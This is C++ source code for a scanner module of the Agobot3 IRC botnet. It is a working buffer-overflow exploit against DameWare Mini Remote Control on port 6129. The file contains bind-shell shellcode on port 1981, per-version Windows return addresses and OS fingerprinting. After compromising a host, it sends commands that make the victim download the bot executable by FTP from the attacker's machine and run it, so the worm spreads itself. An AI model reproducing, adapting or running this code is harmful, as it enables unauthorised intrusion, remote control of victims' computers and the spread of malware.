/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

/******************************************************************************* 
 *
 * Exploit by PhaTTy w/ bindport! 
 * 
 * Vulnerable Versions: <= 3.72.0.0 
 * Tested on: 3.72.0.0 Win2k SP3 & WinXp SP3 & Win2k3 SP0
 *
 *******************************************************************************/ 

#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
#ifdef __COMPILE_SCANNER_DAMEWARE__
#include "utility.h"
#include "shellcode.h"

class CScannerDW : public CScannerBase
{
public:
	CScannerDW();
	virtual ~CScannerDW() throw() { }
	bool Exploit();
};

#define ID_UNKNOWN	0
#define ID_WIN2K	1
#define ID_WINXP	2
#define ID_WIN2K3	3
#define ID_WINNT	4
#define VER			"0.5"

unsigned char send_buff[40] = {
	0x30, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC3, 0xF5, 0x28, 0x5C, 0x8F, 0xC2, 0x0D, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };

// works hidden cmd.exe
char phatty_rshell[] = //bind port 1981
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF" 
	"\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
	"\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
	"\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
	"\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
	"\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
	"\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
	"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
	"\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
	"\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
	"\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
	"\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
	"\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
	"\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
	"\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
	"\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
	"\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
	"\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
	"\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
	"\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
	"\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
	"\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
	"\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
	"\xFA\xFA\xFC\xE9\xED\x99";

int check_os(char *host, unsigned short target_port, int *sp); 

struct sp_levels 
{	unsigned long eip;
	char library[20]; }; 

// I'm not gonna touch that struct, I'd rather die a slow and painful death - Ago :)

struct 
{ 
 //int sp; 
 //unsigned long eip; 
 char os_type[10]; 
 struct sp_levels sp[7]; 

} target_os[]= 
{ 
 { 
  "UNKNOWN",{{0,""},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}} 
 }, 
 { 
 "WIN 2000", 
  {{ 0x750362c3,"ws2_32.dll" },{ 0x75035173,"ws2_32.dll" },{ 0x717564B8,"comctl32.dll" },
  {  0x717564B8,"comctl32.dll" },{ 0x717564B8,"comctl32.dll" },{ 0,"" },{ 0,"" } } //sp3 OK 0x77dc6d03, sp4 OK 0x7c2ec68b
 }, 
 { 
 "WIN XP", 
  {  { 0x71ab7bfb,"ws2_32.dll" },{ 0x773AD507,"advapi32.dll" },{ 0,"" },
   { 0,"" },{ 0,"" },{ 0,"" },{ 0,"" } } //2 sp on winxp ,0x77e2d9d3, 0x773E19C3 chez moi (xp sp1 us)
 }, 
 { 
 "WIN 2003", 
 {{0x77db565c,"advapi32.dll"},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}//SP 0?? 
 }, 
 { 
 "WIN NT4", 
 { // only SP3 + SP 6 r filled in 
 { 0x77777777,"unknown.dll" },{ 0x77777776,"unknown.dll" },{ 0x77777775,"unknown.dll" }, 
 { 0x77f326c6,"kernel32.dll" },{ 0x77777773,"unknown.dll" },{ 0x77777772,"unknown.dll" }, 
  { 0x77f9d463,"kernel32.dll" }   
 }//6 SP 
 } 

}; 

CScannerDW::CScannerDW() { m_szType="CScannerDW"; m_sScannerName.Assign("DW"); }

bool CScannerDW::Exploit()
{	if (g_pMainCtrl->m_pBot->scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: scanning ip %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}
	char szRecvBuf[5096], szReqBuf[5096]; char *pTemp;
	int os_sp=0, os_ver=check_os((char*)m_sSocket.m_szHost,6129,&os_sp);

	// Build a buffer with the shellcode

	memcpy(szReqBuf,"\x10\x27",2);  
	memset(szReqBuf+0xc4+9,0x90,500); 

	*(unsigned long*)&szReqBuf[516] = target_os[os_ver].sp[os_sp].eip;
	
	memcpy(szReqBuf+520,				phatty_rshell,			strlen(phatty_rshell)	);
	memcpy(szReqBuf+1042,				"neTmaNiac",			9						);
	memcpy(szReqBuf+0x5b4+0x24,			"netmaniac was here",	18						);
	memcpy(szReqBuf+0x5b4+0x128,		"12/12/04 13:13:13",	17						);
	memcpy(szReqBuf+0x5b4+0x538,		"netninjaz_place",		15						);
	memcpy(szReqBuf+0x5b4+0x5b4+0x88,	"131.131.131.131",		16						);
	memcpy(szReqBuf+0x5b4+0x5b4+0x394,	"3.72.0.0",				strlen("3.72.0.0")		);

	// Connect to the server
	if(!m_sSocket.Connect(m_sSocket.m_szHost, 6129)) // Connect failed, exit
	{	return false; }

	m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000);
	memset(szRecvBuf,0,sizeof(szRecvBuf)); 
	Sleep(500);
	if(!m_sSocket.Write((char*)send_buff, sizeof(send_buff))) { m_sSocket.Disconnect(); return false; }
	Sleep(2000);
	m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000);
	Sleep(500);
	if(!m_sSocket.Write((char*)szReqBuf, sizeof(szReqBuf))) { m_sSocket.Disconnect(); return false; }

	Sleep(10000); CSocket outSocket;

	if(!outSocket.Connect(m_sSocket.m_szHost, 1981)) // Connect failed, exit
	{	if (g_pMainCtrl->m_pBot->scaninfo_level.iValue >= 2)
		{
			SendLocal("%s: Not vulnerable: %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
		}
		m_sSocket.Disconnect(); return false; }

	char mkdir_buff[400]="";
	int iPort=g_pMainCtrl->m_pBot->bot_ftrans_port_ftp.iValue;

	sprintf(mkdir_buff,
		"echo open %s %d > bla.txt\n"
		"echo user blah blah >> bla.txt\n"
		"echo binary >> bla.txt\n"
		"echo get %s >> bla.txt\n"
		"echo quit >> bla.txt\n"
		"ftp.exe -n -s:bla.txt\n"
		"%s\n",
		g_pMainCtrl->m_pIRC->m_sLocalIp.CStr(), iPort, "bot.exe", "bot.exe");

	if(!outSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	Sleep(500);

	if(!outSocket.Write((char*)mkdir_buff, sizeof(mkdir_buff))) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	// successful!!!
	if (g_pMainCtrl->m_pBot->scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: Exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}

	m_sSocket.Disconnect(); return true;
}

int check_os(char *host,unsigned short target_port, int *sp) 
{	char recv_buff1[5000]="";
	CSocket sSocket; if(!sSocket.Connect(host, target_port)) return 1;	
	if(!sSocket.RecvTO(recv_buff1, sizeof(recv_buff1), 5000)) return 1;
	if(!sSocket.Write((const char*)send_buff, sizeof(send_buff))) return 1;
	if(!sSocket.RecvTO(recv_buff1, sizeof(recv_buff1), 5000)) return 1;
	sSocket.Disconnect(); *sp=atoi(&recv_buff1[37]); 

	if		(recv_buff1[8]==5 && recv_buff1[12]==0)	return ID_WIN2K;
	else if	(recv_buff1[8]==5 && recv_buff1[12]==1)	return ID_WINXP;
	else if	(recv_buff1[8]==5 && recv_buff1[12]==2)	return ID_WIN2K3;
	else if	(recv_buff1[8]==4)						return ID_WINNT;
	else											return ID_UNKNOWN; } 

REGSCANNER(DW_6129, DW, 6129, true, true, false);

#endif // __COMPILE_SCANNER_DAMEWARE__
